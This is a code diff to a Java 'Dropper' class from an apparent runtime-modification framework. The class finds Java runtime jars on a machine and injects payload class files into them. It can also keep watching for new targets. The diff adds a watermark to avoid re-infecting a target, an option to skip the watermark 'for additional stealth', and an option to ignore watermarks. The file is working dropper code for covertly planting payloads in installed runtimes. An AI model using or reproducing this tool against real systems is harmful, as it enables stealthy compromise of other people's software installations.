@@ -39,12 +39,14 @@ import org.xml.sax.InputSource;
 import org.xml.sax.SAXException;
 
 import jreframeworker.engine.Engine;
+import jreframeworker.engine.utils.JarModifier;
 
 public class Dropper {
 	
 	// jar contents
 	public static final String CONFIG_FILE = "config.xml";
 	public static final String PAYLOAD_DIRECTORY = "payloads";
+	public static final String WATERMARK = "jref";
 	
 	// configuration keys
 	public static final String MERGE_RENAME_PREFIX = "merge-rename-prefix";
@@ -92,6 +94,16 @@ public class Dropper {
 	private static final String SEARCH_DIRECTORIES_SHORT_ARGUMENT = "-s";
 	private static final String SEARCH_DIRECTORIES_DESCRIPTION = " Specifies a comma separated list of directory paths to search for runtimes, if not specified a default set of search directories will be used.";
 
+	private static boolean watermark = true;
+	private static final String DISABLE_WATERMARK_LONG_ARGUMENT = "--disable-watermarking";
+	private static final String DISABLE_WATERMARK_SHORT_ARGUMENT = "-dw";
+	private static final String DISABLE_WATERMARK_DESCRIPTION = " Disables watermarking the modified target (can be used for additional stealth, but could also cause problems for watchers). Watermarks are used to prevent remodifying a target.";
+	
+	private static boolean ignoreWatermarks = false;
+	private static final String IGNORE_WATERMARK_LONG_ARGUMENT = "--ignore-watermarks";
+	private static final String IGNORE_WATERMARK_SHORT_ARGUMENT = "-iw";
+	private static final String IGNORE_WATERMARK_DESCRIPTION = " Ignores watermarks and modifies targets regardless of whether or not they have been previously modified.";
+	
 	private static final String WATCHER_SLEEP_TIME_LONG_ARGUMENT = "--watcher-sleep";
 	private static final String WATCHER_SLEEP_TIME_SHORT_ARGUMENT = "-ws";
 	private static final String WATCHER_SLEEP_TIME_DESCRIPTION = "     The amount of time in milliseconds to sleep between watcher checks.";
@@ -114,6 +126,8 @@ public class Dropper {
 													+ SAFETY_OFF_LONG_ARGUMENT + ", " + SAFETY_OFF_SHORT_ARGUMENT + SAFETY_OFF_DESCRIPTION + "\n"
 													+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT + SEARCH_DIRECTORIES_DESCRIPTION + "\n"
 													+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT + OUTPUT_DIRECTORY_DESCRIPTION + "\n"
+													+ DISABLE_WATERMARK_LONG_ARGUMENT + ", " + DISABLE_WATERMARK_SHORT_ARGUMENT + DISABLE_WATERMARK_DESCRIPTION + "\n"
+													+ IGNORE_WATERMARK_LONG_ARGUMENT + ", " + IGNORE_WATERMARK_SHORT_ARGUMENT + IGNORE_WATERMARK_DESCRIPTION + "\n"
 													+ WATCHER_LONG_ARGUMENT + ", " + WATCHER_SHORT_ARGUMENT + WATCHER_DESCRIPTION + "\n"
 													+ WATCHER_SLEEP_TIME_LONG_ARGUMENT + ", " + WATCHER_SLEEP_TIME_SHORT_ARGUMENT + WATCHER_SLEEP_TIME_DESCRIPTION + "\n"
 													+ PRINT_TARGETS_LONG_ARGUMENT + ", " + PRINT_TARGETS_SHORT_ARGUMENT + PRINT_TARGETS_DESCRIPTION + "\n"
@@ -179,6 +193,14 @@ public class Dropper {
 			
 			else if(args[i].equals(WATCHER_LONG_ARGUMENT) || args[i].equals(WATCHER_SHORT_ARGUMENT)){
 				watcher = true;
+			}
+			
+			else if(args[i].equals(DISABLE_WATERMARK_LONG_ARGUMENT) || args[i].equals(DISABLE_WATERMARK_SHORT_ARGUMENT)){
+				watermark = false;
+			}
+			
+			else if(args[i].equals(IGNORE_WATERMARK_LONG_ARGUMENT) || args[i].equals(IGNORE_WATERMARK_SHORT_ARGUMENT)){
+				ignoreWatermarks = true;
 			}
 			
 			else if(args[i].equals(WATCHER_SLEEP_TIME_LONG_ARGUMENT) || args[i].equals(WATCHER_SLEEP_TIME_SHORT_ARGUMENT)){
@@ -258,20 +280,31 @@ public class Dropper {
 		if(debug) System.out.println(configuration);
 		
 		// modify runtimes
-		Set<String> runtimesToIgnore = new HashSet<String>();
-		for(File runtime : getTargets(searchPaths, configuration)){
+		Set<String> targetsToIgnore = new HashSet<String>();
+		for(File target : getTargets(searchPaths, configuration)){
+			
+			if(!ignoreWatermarks){
+				try {
+					if(new JarModifier(target).getJarEntrySet().contains(WATERMARK)){
+						continue;
+					}
+				} catch (Exception e){
+					// couldn't read target entries
+				}
+			}
+			
 			if(debug){
-				System.out.println("Discovered target: " + runtime.getAbsolutePath());
+				System.out.println("Discovered target: " + target.getAbsolutePath());
 			}
 			if(safetyOff){
 				if(watcher){
 					try {
-						runtimesToIgnore.add(sha256(runtime));
+						targetsToIgnore.add(sha256(target));
 					} catch (Exception e) {
 						// skipping runtime
 					}
 				} else {
-					modifyRuntime(configuration, payloads, runtime);
+					modifyRuntime(configuration, payloads, target, watermark);
 				}
 			}
 		}
@@ -288,15 +321,25 @@ public class Dropper {
 					Thread.sleep(watcherSleepTime);
 					
 					// search for new targets
-					for (File runtime : getTargets(searchPaths, configuration)) {
+					for (File target : getTargets(searchPaths, configuration)) {
 						try {
-							if (!runtimesToIgnore.contains(sha256(runtime))) {
+							if(!ignoreWatermarks){
+								try {
+									if(new JarModifier(target).getJarEntrySet().contains(WATERMARK)){
+										continue;
+									}
+								} catch (Exception e){
+									// couldn't read target entries
+								}
+							}
+							
+							if (!targetsToIgnore.contains(sha256(target))) {
 								if (debug) {
-									System.out.println("Discovered target: " + runtime.getAbsolutePath());
+									System.out.println("Discovered target: " + target.getAbsolutePath());
 								}
 
 								searching = false;
-								modifyRuntime(configuration, payloads, runtime);
+								modifyRuntime(configuration, payloads, target, watermark);
 							}
 						} catch (Exception e) {
 							// skipping runtime
@@ -311,10 +354,10 @@ public class Dropper {
 		if(debug) System.out.println("Finished.");
 	}
 
-	private static void modifyRuntime(Configuration configuration, byte[][] payloads, File runtime) {
+	private static void modifyRuntime(Configuration configuration, byte[][] payloads, File runtime, boolean watermark) {
 		try {
 			File outputRuntime = outputDirectory == null ? File.createTempFile(runtime.getName(), ".jar") : getOutputRuntimeFile(runtime, outputDirectory);
-			modifyRuntime(runtime, configuration.configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, payloads);
+			modifyRuntime(runtime, configuration.configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, watermark, payloads);
 			System.out.println("\nOriginal Runtime: " + runtime.getAbsolutePath() + "\n" + "Modified Runtime: " + outputRuntime.getAbsolutePath());
 		} catch (Exception e) {
 			if(debug) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
@@ -408,10 +451,13 @@ public class Dropper {
 	
 	// TODO: Consider accepting and writing to an output stream instead of a File so that we could generically write to a file, memory, stdout, etc.
 	// TODO: need to consider alternate class loaders
-	private static void modifyRuntime(File originalRuntime, String mergeRenamePrefix, File outputRuntime, byte[]... classFiles) throws JarException, IOException {
+	private static void modifyRuntime(File originalRuntime, String mergeRenamePrefix, File outputRuntime, boolean watermark, byte[]... classFiles) throws JarException, IOException {
 		Engine engine = new Engine(originalRuntime, mergeRenamePrefix);
 		for(byte[] classFile : classFiles){
 			engine.process(classFile);
+		}
+		if(watermark){
+			engine.addFile(WATERMARK, WATERMARK.getBytes(), true);
 		}
 		engine.save(outputRuntime);
 	}
